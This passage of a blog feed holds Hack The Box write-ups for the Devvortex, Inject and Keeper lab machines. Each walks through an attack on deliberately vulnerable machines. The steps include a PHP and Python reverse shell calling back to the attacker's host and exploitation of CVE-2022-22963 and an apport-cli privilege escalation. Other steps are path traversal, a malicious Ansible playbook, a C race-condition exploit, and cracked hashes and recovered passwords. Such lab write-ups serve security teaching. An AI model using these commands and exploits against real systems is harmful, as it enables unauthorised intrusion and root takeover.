+&lt;p&gt;&lt;img src=&quot;./img/8.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;once inside, we go to the system section.&lt;/p&gt;
+&lt;p&gt;Now we just have to edit one of the web or panel files and put php revshell in them, we will use this:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./img/9.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;We access the file we edited, to receive the shell to our listening port&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;nc -nlvp 9001              
+listening on [any] 9001 ...
+connect to [10.10.14.145] from (UNKNOWN) [10.10.11.242] 41690
+Linux devvortex 5.4.0-167-generic #184-Ubuntu SMP Tue Oct 31 09:21:49 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
+ 15:47:51 up  4:52,  0 users,  load average: 0.57, 0.34, 0.13
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+sh: 0: can&apos;t access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Lateral Movement&amp;lt;/span&amp;gt;&lt;/h2&gt;
+&lt;h3&gt;Mysql Database&lt;/h3&gt;
+&lt;p&gt;Previously we had seen that there was a mysql database, so we tried to connect:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;gt; mysql -u lewis -p 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;show databases;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;use joomla;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;show tables;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;select * from sd4fg_users
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;After looking at all the contents of the database, we find the following hash of user logan:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;logan:$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12&lt;/code&gt;&lt;/p&gt;
+&lt;h3&gt;Crack Hash&lt;/h3&gt;
+&lt;p&gt;We identify the hash and crack with john&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./img/10.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;we move to the user logan&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;gt; su logan
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Privilege Escalation&amp;lt;/span&amp;gt;&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;logan@devvortex:~$ sudo -l
+[sudo] password for logan:
+Matching Defaults entries for logan on devvortex:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User logan may run the following commands on devvortex:
+    (ALL : ALL) /usr/bin/apport-cli
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;CVE-2023–1326 - Privilege Escalation - apport-cli 2.26.0&lt;/h3&gt;
+&lt;p&gt;In this part I am going to show you 2 ways to escalate privileges:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;apport-cli Privilege Escalation&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;we create a sh file and run it with the apport-cli&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code&gt;logan@devvortex:/tmp$ echo &apos;Hello apport-cli&apos; &amp;gt; exp.sh
+logan@devvortex:/tmp$ chmod +x exp.sh
+logan@devvortex:/tmp$ sudo apport-cli -c exp.sh less
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We select V for the option to view report and when it says ‘:’, we insert the shell !/bin/bash&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;What would you like to do? Your options are:
+  S: Send report (1.6 KB)
+  V: View report
+  K: Keep report file for sending later or copying to somewhere else
+  I: Cancel and ignore future crashes of this program version
+  C: Cancel
+Please choose (S/V/K/I/C): V
+&amp;lt;HERE YOU GET &quot;less&quot; command output type &quot;!/bin/bash&quot;&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;# id
+uid=0(root) gid=0(root) groups=0(root)
+&lt;/code&gt;&lt;/pre&gt;
+</content:encoded></item><item><title>Inject HTB Writeup</title><link>https://fuwari.vercel.app/posts/inject/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/inject/</guid><description>Easy Machine</description><pubDate>Mon, 01 Apr 2024 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;Inject is an easy Linux machine created by rajHere on Hack The Box that involves Exploiting a Directory Traversal bug to locate and read local files as frank. We use this vulnerability to enumerate software versions involved in the web server, where we find an outdated Spring Framework installation that is vulnerable to a critical bug tracked as CVE-2022-22963. This bug is then used to gain code execution as frank, and find credentials for phil in frank’s home directory. The user phil is permitted to write Ansible playbooks to a certain directory that is used by root in scheduled CRON jobs. With a special playbook, we are then able to execute code as root and fetch the system flag&lt;/p&gt;
+&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Initial Recon&amp;lt;/span&amp;gt;&lt;/h2&gt;
+&lt;p&gt;Let’s set up our environment and run a TCP port scan with this custom nmap wrapper.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# mhil4ne@Kali (bash)
+rhost=&quot;10.10.11.204&quot; # Target IP address
+lhost=&quot;10.10.14.4&quot; # Your VPN IP address
+echo rhost=$rhost &amp;gt;&amp;gt; .env
+echo lhost=$lhost &amp;gt;&amp;gt; .env
+. ./.env &amp;amp;&amp;amp; ctfscan $rhost
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The open ports reported in the scan include:&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Port&lt;/th&gt;
+&lt;th&gt;Service&lt;/th&gt;
+&lt;th&gt;Product&lt;/th&gt;
+&lt;th&gt;Version&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;22&lt;/td&gt;
+&lt;td&gt;ssh&lt;/td&gt;
+&lt;td&gt;OpenSSH&lt;/td&gt;
+&lt;td&gt;8.9p1&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;80&lt;/td&gt;
+&lt;td&gt;HTTP&lt;/td&gt;
+&lt;td&gt;Nagios NSCA&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Web&amp;lt;/span&amp;gt;&lt;/h2&gt;
+&lt;p&gt;We’ll begin by exploring the HTTP server on port 8080 since web services are often vulnerable. Let’s also route our requests through our local BurpSuite proxy or just use BurpSuite’s built-in browser.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./img/1.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;The home page introduces a few features including the ability to upload files. Let’s check out that page since file uploads are a slippery slope when it comes to security.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./img/2.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;We’ll try uploading a file in our browser session while we capture the request with BurpSuite.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;POST /upload HTTP/1.1
+Host: 10.10.11.204:8080
+Content-Length: 220
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAPgIHu4nfmqDyyE2
+User-Agent: BurpSuite
+Accept: */*
+
+------WebKitFormBoundaryAPgIHu4nfmqDyyE2
+Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;demo.txt&quot;
+Content-Type: text/plain
+
+This is a standard UTF-8 text file...
+
+------WebKitFormBoundaryAPgIHu4nfmqDyyE2--
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;./img/3.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;The response indicates that the form exclusively accepts image files, so we’ll try uploading an image.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./img/4.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;The upload is successful plus we get to view the image dynamically at the /show_image endpoint.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./img/5.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;h3&gt;File Disclosure&lt;/h3&gt;
+&lt;p&gt;t appears that the image file is loaded dynamically from the filesystem using the img parameter. Let’s see if we can read any files outside of our working directory like /etc/passwd.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# mhil4ne@kali (bash)
+curl &quot;http://$rhost:8080/show_image?img=../../../../../../etc/passwd&quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;root:.x:0:0:root:/root:/bin/bash
+daemon:.x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:.x:2:2:bin:/bin:/usr/sbin/nologin
+...
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We can seemingly use this endpoint to read local files using a generic directory traversal payload. Messing around a bit more, we find out that we can list directories as well.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# mhil4ne@kali (bash)
+curl &quot;http://$rhost:8080/show_image?img=../../../../../../&quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;bin
+boot
+dev
+...
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;Remote Code Execution&lt;/h3&gt;
+&lt;p&gt;Let’s find the application source so we can look for credentials or additional attack surface.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# mhil4ne@kali (bash)
+inject_fetch() { curl -sm 1 &quot;http://$rhost:8080/show_image?img=&quot;$@; }
+inject_fetch ../ # read parent directory
+inject_fetch ../java # keep looking ...
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We eventually find what appears to be the project root for the current Java application at ../../../{:.filepath}. Within that directory, we find the Maven project configuration at pom.xml{:.filepath} containing a couple of notable software fingerprints.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;org.springframework.boot 2.6.5&lt;/li&gt;
+&lt;li&gt;spring-cloud-function-web 3.2.2&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;If we search for vulnerabilities with either fingerprint, we see references to a couple of different CVEs. We confirm that Spring Cloud Function version 3.2.2 is vulnerable to CVE-2022-22963 by Checking the CVEDetails description.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;In Spring Cloud Function versions 3.1.6, 3.2.2 and older unsupported versions, when using routing functionality it is possible for a user to provide a specially crafted SpEL as a routing-expression that may result in remote code execution and access to local resources&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;There is already a number of proof-of-concept exploits out there, but I decided to create one anyways here. We’ll use this program to spawn a reverse shell that answers to a PwnCat listener.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# mhil4ne@kali (bash)
+pwncat-cs -c &amp;lt;(echo &quot;listen -m linux -H $lhost 443&quot;)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;# mhil4ne@kali (bash)
+inject_fetch ../../../../../../usr/bin | grep &apos;^python&apos; # python3 is installed
+tmp=$(mktemp -d)
+cat &amp;lt;&amp;lt; EOF &amp;gt; $tmp/index.html
+import os,pty,socket
+s=socket.socket()
+s.connect((&quot;$lhost&quot;,443))
+[os.dup2(s.fileno(),f)for(f)in(0,1,2)]
+pty.spawn(&quot;bash&quot;)
+EOF
+python3 -m http.server --bind $lhost --directory $tmp 80 &amp;amp;
+python3 CVE-2022-22963.py &quot;http://$rhost:8080&quot; &quot;curl $lhost -o/tmp/_d&quot;
+python3 CVE-2022-22963.py &quot;http://$rhost:8080&quot; &quot;python3 /tmp/_d&quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We should then get a callback to our listener on port 443 as the user frank.&lt;/p&gt;
+&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Privilege Escalation&amp;lt;/span&amp;gt;&lt;/h2&gt;
+&lt;h3&gt;Frank&lt;/h3&gt;
+&lt;p&gt;We begin exploring the filesystem starting with frank’s home directory&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# frank@inject (bash)
+find ~ -type f
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;/home/frank/.bashrc
+/home/frank/.m2/settings.xml
+...
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;There’s a Maven user configuration file at ~/.m2/settings.xml{:.filepath} that contains credentials for the user phil.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
+&amp;lt;settings xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
+        xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&amp;gt;
+  &amp;lt;servers&amp;gt;
+    &amp;lt;server&amp;gt;
+      &amp;lt;id&amp;gt;Inject&amp;lt;/id&amp;gt;
+      &amp;lt;username&amp;gt;phil&amp;lt;/username&amp;gt;
+      &amp;lt;password&amp;gt;DocPhillovestoInject123&amp;lt;/password&amp;gt;
+      &amp;lt;privateKey&amp;gt;${user.home}/.ssh/id_dsa&amp;lt;/privateKey&amp;gt;
+      &amp;lt;filePermissions&amp;gt;660&amp;lt;/filePermissions&amp;gt;
+      &amp;lt;directoryPermissions&amp;gt;660&amp;lt;/directoryPermissions&amp;gt;
+      &amp;lt;configuration&amp;gt;&amp;lt;/configuration&amp;gt;
+    &amp;lt;/server&amp;gt;
+  &amp;lt;/servers&amp;gt;
+&amp;lt;/settings&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;Phil&lt;/h3&gt;
+&lt;p&gt;We’ll login as phil with su using the password DocPhillovestoInject123, grab the user flag, then run some simple enumeration commands.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# phil@inject (bash)
+sudo -l # no luck :(
+id # staff group?
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;With the id command, find that phil has membership in a custom group called staff. Let’s see if this group has any special permissions on the filesystem.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# phil@inject (bash)
+find / -group staff -ls 2&amp;gt;/dev/null
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The most notable entry is the /opt/automation/tasks{:.nolineno} directory which grants write privileges to the staff group. Within that folder there is a read-only configuration file (playbook) for an IT automation framework known as Ansible. Since this has to do with automation, we suspect that there is a CRON job or something similar that utilizes this folder at certain intervals. We’ll use PSpy to monitor processes and find scheduled tasks.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# mhil4ne@kali (PwnCat phil@inject)
+upload pspy /home/phil
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;# phil@inject (bash)
+chmod +x pspy &amp;amp;&amp;amp; ./pspy | tee -a pspy.log
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;After a couple minutes, we find a series of privileged processes running every two minutes that interact with /opt/automation/tasks{:.filepath} in a potentially unsafe manner.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;/usr/local/bin/ansible-parallel /opt/automation/tasks/*.yml&lt;/li&gt;
+&lt;li&gt;/usr/bin/ansible-playbook /opt/automation/tasks/playbook_1.yml&lt;/li&gt;
+&lt;li&gt;sleep 10&lt;/li&gt;
+&lt;li&gt;/usr/bin/rm -rf /opt/automation/tasks/*&lt;/li&gt;
+&lt;li&gt;/usr/bin/cp /root/playbook_1.yml /opt/automation/tasks/&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;The first process in question evaluates any path satisfying /opt/automation/tasks/*.yml{:.filepath} as an Ansible playbook. We should be able to get our playbook evaluated since /opt/automation/tasks{:.filepath} is writable.&lt;/p&gt;
+&lt;h3&gt;Ansible&lt;/h3&gt;
+&lt;p&gt;It turns out, executing commands in an Ansible playbook is possible and well documented, meaning we should be able to escalate to root this way. We’ll just add a task that will grant the SUID bit to /bin/sh{:.filepath}, making sure that we clean up after ourselves to not ruin the box for others.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;- hosts: localhost
+  tasks:
+  - name: pwn
+    ansible.builtin.shell: &quot;chmod +s /bin/sh&quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;# phil@inject (bash)
+cat &amp;lt;&amp;lt; EOF &amp;gt; /opt/automation/tasks/pwnbook.yml
+- hosts: localhost
+  tasks:
+  - name: pwn
+    ansible.builtin.shell: chmod +s /bin/sh
+EOF
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;After a couple minutes we verify that /bin/sh{:.filepath} or /bin/dash{:.filepath} have SUID, then spawn a root shell.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# phil@inject (bash)
+/bin/sh -pi
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;Alternative Solution (Bonus)&lt;/h3&gt;
+&lt;p&gt;Let’s pretend that the magical wildcard used to execute our own playbook didn’t exist. Even without this, we can solve this machine by abusing a race condition in a CRON job. See, every two minutes root evaluates the playbook at /opt/automation/tasks/playbook_1.yml{:.filepath} alongside the following command:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sleep 10 &amp;amp;&amp;amp;
+  rm -rf /opt/automation/tasks/* &amp;amp;&amp;amp;
+  cp /root/playbook_1.yml /opt/automation/tasks/
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt; gantt
+  dateFormat mm:ss
+  axisFormat %M:%S
+  tickInterval 2minute
+  title Process creation flow
+  section CRON Job
+  Run playbook : crit, milestone, p1, 00:00, 0s
+  Sleep : p2, 00:00, 10s
+  Remove playbooks : milestone, p3, 00:10, 0s
+  Copy original playbook to tasks folder : milestone, p4, 00:10, 0s
+  CRON Wait : w, 00:00, 2m
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Looking at the timing of the calls from our PSpy log, we notice that the original playbook is deleted then replaced within under a second. It turns out, we can actually use the time between these actions to entirely prevent the playbook from being replaced. We do this by creating a directory at /opt/automation/tasks/playbook_1.yml{:.filepath} while the path is unclaimed. When the task attempts to populate that path, it runs into an error since a file cannot overwrite a directory no matter what the permissions are. Once the cp command fails, we’ll delete the directory and replace it with our malicious playbook, which is then evaluated after a couple minutes.&lt;/p&gt;
+&lt;p&gt;We just need to create a speedy compiled program that is efficient enough to time this correctly. The following Program should work nicely:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;// gcc -static ./privesc2.c -o privesc2
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+#include &amp;lt;sys/stat.h&amp;gt;
+#include &amp;lt;sys/types.h&amp;gt;
+
+#define PLAYBOOK_PATH &quot;/opt/automation/tasks/playbook_1.yml&quot;
+#define PLAYBOOK &quot;- hosts: localhost\n&quot;\
+                 &quot;  tasks:\n&quot;\
+                 &quot;  - name: pwn\n&quot;\
+                 &quot;    ansible.builtin.shell: chmod +s /bin/sh\n&quot;
+
+void replace() {
+  struct stat sb;
+
+  while(1) {
+    if (stat(PLAYBOOK_PATH, &amp;amp;sb) != 0) {
+      if (mkdir(PLAYBOOK_PATH, 0700) == 0) {
+        puts(&quot;Swapped with directory!&quot;);
+        return;
+      }
+      puts(&quot;Fail!&quot;);
+      sleep(110);
+    }
+    usleep(100);
+  }
+}
+
+void plant() {
+  FILE *file;
+  if (file = fopen(PLAYBOOK_PATH, &quot;w&quot;)) {
+    fprintf(file, &quot;%s&quot;, PLAYBOOK);
+    fclose(file);
+  }
+}
+
+int main(int argc, char* argv[]) {
+  replace();
+  sleep(10);
+  system(&quot;rm -rf /opt/automation/tasks/playbook_1.yml&quot;);
+  plant();
+  puts(&quot;Done!&quot;);
+  return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Running the compiled executable on the target should replace the file with our malicious playbook after a couple minutes. We then wait another couple minutes and run /bin/sh -pi to spawn a root shell.&lt;/p&gt;
+</content:encoded></item><item><title>Keeper HTB Writeup</title><link>https://fuwari.vercel.app/posts/keeper/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/keeper/</guid><description>Easy Machine</description><pubDate>Mon, 01 Apr 2024 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;Keeper is an Easy machine from Hack The Box challenge. Eumeration kicks off with an Nmap scan revealing SSH and HTTP services. The HTTP service runs Request Tracker 4.4.4, known for an information disclosure vulnerability via user enumeration. Default credentials for ‘root’ are found. Accessing the admin panel discloses a user’s password, ‘Welcome2023!’.&lt;/p&gt;
+&lt;p&gt;Using SSH with found credentials grants access to an Ubuntu system. A Keepass database and program dump are discovered, leading to the recovery of the master password ‘rødgrød med fløde’ (Danish dessert), granting access to the Keepass database. A Putty PPK file is found and converted to an RSA key, allowing SSH access as ‘root.’ This progression results in successful completion of the challenge.&lt;/p&gt;
+&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Initial Recon&amp;lt;/span&amp;gt;&lt;/h2&gt;
+&lt;p&gt;We verify our connection with the machine, in case it does not respond, Check your VPN file:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ ping -c 1 10.10.11.227                                            
+PING 10.10.11.227 (10.10.11.227) 56(84) bytes of data.
+64 bytes from 10.10.11.227: icmp_seq=1 ttl=63 time=140 ms
+
+--- 10.10.11.227 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 140.045/140.045/140.045/0.000 ms
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;we start our scanning with nmap:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;gt; sudo nmap -sS --open -p- --min-rate 5000 -n -Pn -v 10.10.11.227 -oG nmapScan
+
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Let’s perform a more in-depth scan:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;nmap -sVC -p22,80 10.10.11.227 -oN ports
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA)
+|_  256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Site doesn&apos;t have a title (text/html).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/code&gt;&lt;/pre&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Port&lt;/th&gt;
+&lt;th&gt;Service&lt;/th&gt;
+&lt;th&gt;Product&lt;/th&gt;
+&lt;th&gt;Version&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;22&lt;/td&gt;
+&lt;td&gt;ssh&lt;/td&gt;
+&lt;td&gt;OpenSSH&lt;/td&gt;
+&lt;td&gt;8.9p1&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;80&lt;/td&gt;
+&lt;td&gt;HTTP&lt;/td&gt;
+&lt;td&gt;nginx&lt;/td&gt;
+&lt;td&gt;1.18.0&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;For now we do not try anything through ssh since we do not have valid credentials, So let’s look at the website.&lt;/p&gt;
+&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Web&amp;lt;/span&amp;gt;&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&quot;./img/1.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;h3&gt;Default Credentials In Tracker&lt;/h3&gt;
+&lt;p&gt;When browsing to this page we are greeted with the following login page. We can see that its using Request tracker When looking online i could find that the default credentials for the root account is password Entering this password gave us access to the web application.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./img/2.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;When looking through the application we can find two interesting pages. The first being the recently opened tickets page. which discloses an issue one of the users is having. They are saying they have a crash dump in their home directory to help the admins debug their issues with keepass. This is very interesting information giving us a target to go after once we have access to the system.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./img/3.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Secondly when checking out the users panel of the application we could see that the same user we noticed before in the ticket had a note on her profile. This note mentioned their default starters password. Using this password gave us access to the machine with ssh using the password Welcome2023!&lt;/p&gt;
+&lt;h3&gt;SSH Credentials&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;ssh lnorgaard@keeper.htb
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Privilege Escalation&amp;lt;/span&amp;gt;&lt;/h2&gt;
+&lt;p&gt;The home folder contains a ZIP archive RT30000.zip. This must be the file relevant to the ticket we’ve seen before. Transfer it to the attacking machine and unzip it.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;gt; unzip RT30000.zip
+Archive:  RT30000.zip
+  inflating: KeePassDumpFull.dmp
+ extracting: passcodes.kdbx
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We get the crash dump for KeePass and a KeePass database file.&lt;/p&gt;
+&lt;h3&gt;Extracting the KeePass master password&lt;/h3&gt;
+&lt;p&gt;It may be possible to extract the master password from the dump file! I’ve attempted to use this Python script for the task: Keepass Dump MasterKey&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;gt; python3 poc.py -d /opt/ctf/htb/keeper/KeePassDumpFull.dmp
+2023-08-12 21:35:47,517 [.] [main] Opened /opt/ctf/htb/keeper/KeePassDumpFull.dmp
+Possible password: ●,dgr●d med fl●de
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;There are some issues with special characters. A quick Google search for dgrd med flde reveals the name of the Danish dish – Rødgrød med fløde.&lt;/p&gt;
+&lt;p&gt;I will use the kpcli utility to interact with the KeePass database file that we have looted.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;gt; kpcli
+
+KeePass CLI (kpcli) v3.8.1 is ready for operation.
+Type &apos;help&apos; for a description of available commands.
+Type &apos;help &amp;lt;command&amp;gt;&apos; for details on individual commands.
+
+kpcli:/&amp;gt; open passcodes.kdbx
+Provide the master password: ************************* #Rødgrød med fløde
+Error opening file: Couldn&apos;t load the file passcodes.kdbx
+
+Error(s) from File::KeePass:
+The database key appears invalid or else the database is corrupt.
+
+kpcli:/&amp;gt; open passcodes.kdbx
+Provide the master password: ************************* #rødgrød med fløde
+kpcli:/&amp;gt; ls
+=== Groups ===
+passcodes/
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Success! The KeePass database master password is rødgrød med fløde. Let’s find some credentials.&lt;/p&gt;
+&lt;h3&gt;SSH Private Key for root&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;kpcli:/&amp;gt; ls *
+=== Groups ===
+eMail/
+General/
+Homebanking/
+Internet/
+Network/
+Recycle Bin/
+Windows/
+kpcli:/&amp;gt; ls */*
+/passcodes/eMail:
+
+/passcodes/General:
+
+/passcodes/Homebanking:
+
+/passcodes/Internet:
+
+/passcodes/Network:
+=== Entries ===
+0. keeper.htb (Ticketing Server)
+1. Ticketing System
+
+/passcodes/Recycle Bin:
+=== Entries ===
+2. Sample Entry                                               keepass.info
+3. Sample Entry #2                          keepass.info/help/kb/testform.
+
+/passcodes/Windows:
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;kpcli:/&amp;gt; cd /passcodes/Network
+kpcli:/passcodes/Network&amp;gt; ls
+=== Entries ===
+0. keeper.htb (Ticketing Server)
+1. Ticketing System
+kpcli:/passcodes/Network&amp;gt; show -f 0
+
+Title: keeper.htb (Ticketing Server)
+Uname: root
+ Pass: &amp;lt;REDACTED&amp;gt;
+  URL:
+Notes: PuTTY-User-Key-File-3: ssh-rsa
+       Encryption: none
+       Comment: rsa-key-20230519
+       Public-Lines: 6
+       AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
+       &amp;lt;REDACTED&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;It looks like we have a root SSH private key for PuTTY! Let’s convert it to the OpenSSH-acceptable format with puttygen:&lt;/p&gt;
